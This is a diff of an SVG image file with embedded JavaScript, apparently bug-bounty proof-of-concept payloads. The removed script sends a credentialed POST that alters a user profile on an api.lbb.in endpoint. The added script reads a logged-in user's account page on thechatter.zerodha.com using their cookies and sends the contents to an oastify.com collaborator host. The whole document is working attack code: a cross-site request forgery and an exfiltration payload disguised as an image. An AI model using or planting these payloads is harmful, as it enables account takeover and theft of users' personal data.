@@ -1,18 +1,12 @@
 <svg xmlns="http://www.w3.org/2000/svg">
- <script><![CDATA[
-  fetch("https://api.lbb.in/web/users", {
-   method: "POST",
-   credentials: "include",
-   headers: {
-    "Content-Type": "application/json"
-   },
-   body: JSON.stringify({
-    firstName: "new",
-    lastName: "bie",
-    description: "bugs chained",
-    instagramLink: "",
-    websiteLink: ""
-   })
+ <script>
+  fetch("https://thechatter.zerodha.com/account", {
+   method: "GET",
+   credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+   fetch("https://c8lqholsexggqulev5hdzqyef5lw9mxb.oastify.com/log?data=" + encodeURIComponent(data));
   });
- ]]></script>
+ </script>
 </svg>
